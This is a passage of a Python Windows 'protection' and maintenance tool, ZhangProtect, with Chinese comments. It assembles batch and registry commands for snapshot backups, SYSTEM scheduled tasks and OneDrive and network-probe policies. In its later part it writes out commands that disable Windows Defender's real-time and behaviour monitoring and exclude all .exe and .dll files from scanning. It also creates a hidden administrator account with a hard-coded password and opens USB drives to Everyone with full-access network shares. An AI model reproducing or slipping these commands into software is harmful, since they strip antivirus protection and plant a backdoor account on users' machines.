                        )
                        new_hsh_cmd = (
                            SnapShotExe
                            + " "
                            + System_Backup_Image_full
                            + " -h"
                            + hash_file
                        )
                        Backup_Stat("生成新哈希文件:" + new_hsh_cmd)
                        new_hsh_cmd_result = os.popen(new_hsh_cmd).read()
                        Backup_Stat(
                            "生成新哈希文件操作成功完成:" + new_hsh_cmd_result.splitlines()[-1]
                        )
                        while os.path.isfile(System_Backup_Image):
                            System_Backup_Image = (
                                datadir
                                + ":\\Important\\System_Backup\\System_Backup_Add_"
                                + str(Todaytime)
                                + "-"
                                + str(random.randrange(1, 2048576))
                                + ".sna"
                            )
                        Add_Image_Command = (
                            SnapShotExe
                            + " %systemdrive% "
                            + System_Backup_Image
                            + " -R -L0 -h"
                            + hash_file
                        )
                        Backup_Stat("执行差异备份系统：" + Add_Image_Command)
                        backup_result = os.popen(Add_Image_Command).read()
                        Backup_Stat("差异备份操作成功完成" + str(backup_result))
                        Test_Image_Command = (
                            '"' + SnapShotExe + '" "' + System_Backup_Image + '" -T'
                        )
                        Test_Image = str(os.popen(Test_Image_Command).read())
                        if ("Some error occurred" in Test_Image) or (
                            not os.path.isfile(hash_file)
                        ):
                            os.remove(System_Backup_Image)
                            Backup_Stat("差异备份校验不通过，重新备份：" + Test_Image)
                            continue
                        else:
                            Backup_Stat("差异备份已完成，系统备份校验通过" + Test_Image)
                            break
                    elif System_Backup_flag == "new":
                        with open(System_Backup_Date, "w") as f:
                            f.write(Todaytime)
                        New_Image_Command = (
                            SnapShotExe
                            + " %systemdrive% "
                            + System_Backup_Image
                            + " -R -L0"
                        )
                        Backup_Stat("执行完整备份系统：" + New_Image_Command)
                        backup_result = os.popen(New_Image_Command).read()
                        Backup_Stat("完整备份操作成功完成" + str(backup_result))
                        Test_Image_Command = (
                            '"' + SnapShotExe + '" "' + System_Backup_Image + '" -T'
                        )
                        Test_Image = str(os.popen(Test_Image_Command).read())
                        if ("Some error occurred" in Test_Image) or (
                            not os.path.isfile(hash_file)
                        ):  # 对已存在的镜像进行校验，通过就判断今天是否备份过，不通过立即创建新备份
                            System_Backup_flag = "new"
                            os.popen('del /f /q "' + Backup_Dir + '\\*.*"').read()
                            Backup_Stat("系统备份校验不通过，重新备份：" + Test_Image)
                            continue
                        else:
                            Backup_Stat("系统备份校验通过：" + Test_Image)
                        new_hsh_cmd = (
                            SnapShotExe
                            + " "
                            + System_Backup_Image_full
                            + " -h"
                            + hash_file
                        )
                        Backup_Stat("生成新哈希文件:" + new_hsh_cmd)
                        new_hsh_cmd_result = os.popen(new_hsh_cmd).read()
                        Backup_Stat(
                            "生成新哈希文件操作成功完成:" + new_hsh_cmd_result.splitlines()[-1]
                        )
                        break
                except Exception as e:
                    Backup_Stat(
                        "错误:自动备份异常退出："
                        + str(sys.exc_info())
                        + "行:"
                        + str(e.__traceback__.tb_lineno)
                    )
            Backup_Stat("自动备份操作成功完成")
            return True

        else:
            Backup_Stat("自动备份退出:策略设置禁止执行自动备份")
            return False
    except Exception as e:
        Backup_Stat(
            "错误:自动备份异常退出：" + str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno)
        )
        return False


# 初始化变量
# 这里的大部分变量都是根据配置文件定义的
def defind():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, logs, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion, SystemVersion, wificonf
    try:
        if hidesettingflag == "1" or os.path.isfile(Open_SystemBackup_Flag):
            System_Backup_Pro = threading.Thread(target=System_Backup, args=(datadir,))
            System_Backup_Pro.start()
            log(logs, "根据策略设置，创建自动备份线程")
        ztimeoutA = 0
        ztimeoutB = 0
        pronamesys = "cmd.exe"
        ncsifix = str(ProtectDir).replace("\\", "/")
        ncsiurl = "file:///" + ncsifix
        ncsiurl = ncsiurl[:-1:]
        wificonf = wificonf.split("*")
        wifibd = wificonf[2]
        global wifiid, wifipw
        if os.path.isfile(randomwifissid):
            wifiid = random_key(8)
        else:
            wifiid = wificonf[0]
        if os.path.isfile(randomwifipwd):
            wifipw = random_key(8)
        else:
            wifipw = wificonf[1]
        random_wifi_conf = ""
        if os.path.isfile(randomwifissid) or os.path.isfile(randomwifipwd):
            random_wifi_conf = (
                "本次随机的无线局域网热点\n\nSSID : "
                + wifiid
                + "\n\n密码 : "
                + wifipw
                + "\n\n已同步保存至用户桌面\n信息已显示于任务栏时钟\n生效 : 立即生效\n下次随机更改 : 启动时"
            )
        regstartupcom = (
            "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ZhangProtect /t REG_SZ /d "
            + chr(34)
            + regstartup
            + chr(34)
            + " /f"
        )
        Onedriveupdate = (
            Onedriveupdatedir
            + "\\OneDriveUpdateInduce"
            + str(datetime.datetime.now())
            .replace(" ", "-")
            .replace(":", "-")
            .replace(".", "-")
            + ".txt"
        )
        if hidesettingflag == "1":
            log(logs, "增强模式开关标志为：" + str(hidesettingflag))
            hidesettingflag = "1"
            log(logs, "增强模式开关为开")
        else:
            hidesettingflag = "0"
            log(logs, "增强模式开关为关")
        systemappfixpow = (
            "Get-appxpackage -all *shellexperience* -packagetype bundle |% {add-appxpackage -register -disabledevelopmentmode ($_.installlocation +"
            + chr(34)
            + "appxmetADATAappxbundlemanifest.xml"
            + chr(34)
            + ")}"
        )
        regfixs = (
            "Windows Registry Editor Version 5.00"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Bluetooth\\Audio\\AVRCP\\CT]"
            + chr(10)
            + ""
            + chr(34)
            + "DisableAbsoluteVolume"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\OneDrive]"
            + chr(10)
            + ""
            + chr(34)
            + "DisableFirstDeleteDialog"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "DisablePauseOnMeteredNetwork"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "DisablePauseOnBatterySaver"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "AllowDisablePermissionInheritance"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "GPOSetUpdateRing"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMSilentOptInDesktop"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMSilentOptInDocuments"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMSilentOptInPictures"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "LocalMassDeleteFileDeleteThreshold"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "ForcedLocalMassDeleteDetection"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "WarningMinDiskSpaceLimitInMB"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "EnableHoldTheFile"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "EnableAllOcsiClients"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "DisableTutorial"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "PermitDisablePermissionInheritance"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "EnableAutomaticUploadBandwidthManagement"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "EnableSyncAdminReports"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "AutomaticUploadBandwidthPercentage"
            + chr(34)
            + "=dword:0000003c"
            + chr(10)
            + ""
            + chr(34)
            + "DisableAutoConfig"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "KFMBlockOptOut"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMBlockOptIn"
            + chr(34)
            + "=dword:00000002"
            + chr(10)
            + ""
            + chr(34)
            + "BlockExternalSync"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\OneDrive\\EnableODIgnoreListFromGPO]"
            + chr(10)
            + ""
            + chr(34)
            + "*.sys"
            + chr(34)
            + "="
            + chr(34)
            + "*.sys"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.db"
            + chr(34)
            + "="
            + chr(34)
            + "*.db"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.dat"
            + chr(34)
            + "="
            + chr(34)
            + "*.dat"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.log"
            + chr(34)
            + "="
            + chr(34)
            + "*.log"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "downloads3.txt"
            + chr(34)
            + "="
            + chr(34)
            + "downloads3.txt"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.db-wal"
            + chr(34)
            + "="
            + chr(34)
            + "*.db-wal"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.db-shm"
            + chr(34)
            + "="
            + chr(34)
            + "*.db-shm"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.aodl"
            + chr(34)
            + "="
            + chr(34)
            + "*.aodl"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.otc"
            + chr(34)
            + "="
            + chr(34)
            + "*.otc"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.otc-shm"
            + chr(34)
            + "="
            + chr(34)
            + "*.otc-shm"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.otc-wal"
            + chr(34)
            + "="
            + chr(34)
            + "*.otc-wal"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*edge"
            + chr(34)
            + "="
            + chr(34)
            + "*edge"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*StorageRedirect"
            + chr(34)
            + "="
            + chr(34)
            + "*StorageRedirect"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*onedrive*"
            + chr(34)
            + "="
            + chr(34)
            + "*onedrive*"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.odlsent"
            + chr(34)
            + "="
            + chr(34)
            + "*.odlsent"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.odlgz"
            + chr(34)
            + "="
            + chr(34)
            + "*.odlgz"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*SyncEngine*"
            + chr(34)
            + "="
            + chr(34)
            + "*SyncEngine*"
            + chr(34)
            + ""
        )
        intefix = (
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NlaSvc\\Parameters\\Internet]"
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeContent"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeContentV6"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeHost"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeHostV6"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeContent"
            + chr(34)
            + "="
            + chr(34)
            + "Microsoft NCSI联网测试"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeContentV6"
            + chr(34)
            + "="
            + chr(34)
            + "Microsoft NCSI联网测试"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeHost"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeHostV6"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbePath"
            + chr(34)
            + "="
            + chr(34)
            + "ncsi.txt"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbePathV6"
            + chr(34)
            + "="
            + chr(34)
            + "ncsi.txt"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "CaptivePortalTimer"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "CaptivePortalTimerBackOffIncrementsInSeconds"
            + chr(34)
            + "=dword:00000005"
            + chr(10)
            + ""
            + chr(34)
            + "CaptivePortalTimerMaxInSeconds"
            + chr(34)
            + "=dword:0000001e"
            + chr(10)
            + ""
            + chr(34)
            + "EnableActiveProbing"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "PassivePollPeriod"
            + chr(34)
            + "=dword:0000000f"
            + chr(10)
            + ""
            + chr(34)
            + "StaleThreshold"
            + chr(34)
            + "=dword:0000001e"
            + chr(10)
            + ""
            + chr(34)
            + "WebTimeout"
            + chr(34)
            + "=dword:00000023"
        )
        crash_on = (
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=dword:00000022"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=dword:0000003d"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=dword:00000022"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=dword:0000003d"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=dword:00000022"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=dword:0000003d"
        )
        crash_off = (
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=-"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=-"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=-"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=-"
        )
        if os.path.isfile(donotforcebluescreen):
            regfix = regfixs + chr(10) + intefix + chr(10) + crash_off
        else:
            regfix = regfixs + chr(10) + intefix + chr(10) + crash_on
        if hidesettingflag == "1":
            ProtectSchTask = (
                "/c"
                + " "
                + "schtasks /create /F /tn ZhangProtect\\Protect /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /SC ONLOGON /TR"
                + " "
                + ProtectExe
            )
        else:
            ProtectSchTask = (
                "/c"
                + " "
                + "schtasks /create /F /tn ZhangProtect\\Protect /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /SC ONLOGON /TR"
                + " "
                + ProtectExe
            )
        USBWrite1 = (
            "@echo off"
            + chr(10)
            + "set HereIs=0"
            + chr(10)
            + "set hidesettingflag="
            + chr(34)
            + str(hidesettingflag)
            + chr(34)
            + chr(10)
            + "set Udir="
            + chr(10)
            + ":start"
            + chr(10)
            + "Timeout /t 3"
            + chr(10)
            + "cls"
            + chr(10)
            + "@echo off"
            + chr(10)
            + "    for /f "
            + chr(34)
            + "tokens=2 delims=="
            + chr(34)
            + " %%a in ("
            + chr(39)
            + "wmic LogicalDisk where "
            + chr(34)
            + "DriveType="
            + chr(39)
            + "2"
            + chr(39)
            + ""
            + chr(34)
            + " get DeviceID /value"
            + chr(39)
            + ") do ("
            + chr(10)
            + "      set DriveU=%%a"
            + chr(10)
            + " )"
            + chr(10)
            + "set Udir=%DriveU%"
            + chr(10)
            + "if exist %Udir% (echo.) else (Set HereIs=0 & Set Udir=)"
            + chr(10)
            + "if %HereIs%==0 (if exist %Udir% (goto Work) else goto start) else goto start"
            + chr(10)
            + "goto start"
            + chr(10)
            + ":Work"
            + chr(10)
            + "Set HereIs=1"
            + chr(10)
            + "icacls %Udir%\\* /t /c /q /inheritance:e"
        )
        USBWrite2 = (
            "takeown /f %Udir%\\* /a /r /d y"
            + chr(10)
            + "icacls %Udir%\\* /t /c /grant:r Everyone:(OI)(CI)(F)"
            + chr(10)
            + 'for /f "delims=" %%i in (\'dir /B /A %Udir%\') do ( if "%%i" equ "autorun.inf" (attrib +h +s +r +a /S /D /L "%Udir%\\%%i") else (if "%%i" equ "System Volume Information" (attrib +h +s +r +a /S /D /L "%Udir%\\%%i") else (attrib -h -s -r -a /S /D /L "%Udir%\\%%i")))'
            + chr(10)
            + "del /f /q %Udir%\\autorun.inf"
            + chr(10)
            + "rd /s /q %Udir%\\autorun.inf"
            + chr(10)
            + "mkdir %Udir%\\autorun.inf\\protect..\\"
            + chr(10)
            + "attrib %Udir%\\autorun.inf +s +h +r"
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share USBDiskShare=%Udir% /unlimited /grant:everyone,full)"
            + chr(10)
            + chr(10)
            + "icacls %Udir%\\ /setintegritylevel M"
            + chr(10)
            + "goto start"
        )
        USBWrite = USBWrite1 + chr(10) + USBWrite2
        Uninstaller = (
            "@echo off"
            + chr(10)
            + "set datadir="
            + datadir
            + chr(10)
            + "schtasks /end /tn ZhangProtect\\Protect"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AppProtectA"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AppProtectB"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AppProtectC"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AutoPreA"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AutoPreB"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AutoPreC"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AutoPreD"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\AutoShutdown"
            + chr(10)
            + "schtasks /delete /f /tn ZhangProtect\\BatKeeperRun"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\ProtectKeeper"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\KeepWifi"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\Protect"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\ProtectKeeperBat"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\KeeperRun"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\UsbChanger"
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\*"
            + chr(10)
            + "taskkill /f /im Protect.exe /t"
            + chr(10)
            + "taskkill /f /im DesktopOK.exe /t"
            + chr(10)
            + "taskkill /f /im memreduct.exe /t"
            + chr(10)
            + "taskkill /f /im CCleaner.exe /t"
            + chr(10)
            + 'for /f "delims=" %%i in (\'dir /B /A %datadir%:\\\') do (attrib -a -s -r -h "%datadir%:\\%%i\\desktop.ini" & del /f /q "%datadir%:\\%%i\\desktop.ini")'
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons /f"
            + chr(10)
            + "reg delete HKEY_CLASSES_ROOT\\Directory\\background\\shell\\打开Protect目录 /f"
            + chr(10)
            + "reg delete HKEY_CLASSES_ROOT\\Directory\\background\\shell\\命令行 /f"
            + chr(10)
            + "reg delete HKEY_CLASSES_ROOT\\Directory\\background\\shell\\刷新Protect /f"
            + chr(10)
            + "reg delete HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权命令行 /f"
            + chr(10)
            + "reg delete HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权维护清理 /f"
            + chr(10)
            + "reg delete HKEY_CLASSES_ROOT\\Directory\\background\\shell\\维护清理 /f"
            + chr(10)
            + "shutdown -r -t 30"
            + chr(10)
            + 'del /f /q "'
            + ProtectDir
            + '*.*"'
            + chr(10)
            + 'rd /s /q "'
            + ProtectDir
            + '"'
            + chr(10)
            + "taskkill /f /im powershell.exe /t"
            + chr(10)
            + "taskkill /f /im cmd.exe /t"
            + chr(10)
            + "exit"
        )
        if hidesettingflag == "1":
            autochangepreD = (
                "schtasks /create /F /tn ZhangProtect\\AutoPreD /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /SC MINUTE /mo 3 /TR"
                + " "
                + '"cmd /c '
                + ProtectBAT
                + "<"
                + AutoAnswer
                + '"'
            )
        else:
            autochangepreD = (
                "schtasks /create /F /tn ZhangProtect\\AutoPreD /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /SC MINUTE /mo 3 /TR"
                + " "
                + '"cmd /c '
                + ProtectBAT
                + "<"
                + AutoAnswer
                + '"'
            )
        BatComA1 = (
            "@echo off"
            + chr(10)
            + "setlocal enabledelayedexpansion"
            + chr(10)
            + "set datadir="
            + datadir
            + chr(10)
            + "set hidesettingflag= "
            + chr(34)
            + str(hidesettingflag)
            + chr(34)
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableRealtimeMonitoring $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableBehaviorMonitoring $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableIOAVProtection $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableArchiveScanning $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableIntrusionPreventionSystem $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -SubmitSamplesConsent 2"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -HighThreatDefaultAction 6 -Force"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -ModerateThreatDefaultAction 6"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -LowThreatDefaultAction 6"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -SevereThreatDefaultAction 6"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionExtension "
            + chr(34)
            + ".exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "regsvr.32"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "regsvr.32*"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + ".exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "iexplorer.exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "explorer.exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + ".dll"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "*.dll"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "*.exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "cmd /c powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -MAPSReporting 0"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -PUAProtection disable"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -EnableControlledFolderAccess Disabled"
            + chr(34)
            + ""
            + chr(10)
            + "powercfg -h on"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power /t reg_dword /v HibernateEnabled /d 1 /f"
            + chr(10)
            + "bcdedit /set disabledynamictick yes"
            + chr(10)
            + "bcdedit /set useplatformclock no"
            + chr(10)
            + "bcdedit /set disabledynamictick yes"
            + chr(10)
            + 'net user "ZhangProtectAdmin" "ZhangProtect" /Add'
            + chr(10)
            + 'net user "ZhangProtectAdmin" "ZhangProtect"'
            + chr(10)
            + 'net user "ZhangProtectAdmin" /active:yes /fullname:"ZhangProtectAdmin" /comment:"该账户为ZhangProtect提供管理维护服务，账户密码为ZhangProtect" /workstations:* /passwordreq:no /passwordchg:yes'
            + chr(10)
            + "net localgroup administrators ZhangProtectAdmin /add"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /t REG_DWORD /v ZhangProtectAdmin /d 0 /f'
            + chr(10)
            + "for %%a in (%datadir%:\\StorageRedirect\\Wlansvc\\*.xml) do netsh wlan add profile filename=%%a user=all"
            + chr(10)
            + regstartupcom
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DesktopOK /f"
            + chr(10)
            + 'reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Mem Reduct" /f'
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DesktopOK /f"
            + chr(10)
            + 'reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Mem Reduct" /f'
            + chr(10)
            + "Taskkill /f /im MasterHelper.exe /t"
